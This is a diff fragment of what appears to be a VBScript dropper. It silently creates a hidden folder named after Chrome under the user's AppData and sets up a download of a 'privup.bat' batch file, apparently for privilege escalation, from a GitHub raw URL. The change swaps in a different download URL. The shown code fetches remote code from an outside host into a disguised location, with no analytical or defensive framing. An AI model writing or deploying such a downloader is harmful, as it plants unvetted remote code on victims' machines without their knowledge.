@@ -6,7 +6,7 @@ WshShell.Run "cmd /c mkdir %appdata%\Chrome", 0, True
 Set WshShell = Nothing
 file = Home & "\Chrome\privup.bat"
 
-myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/privup.bat"
+myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-privup.bat"
 myPath = file
 Const ForReading = 1, ForWriting = 2, ForAppending = 8
 Set objFSO = CreateObject( "Scripting.FileSystemObject" )
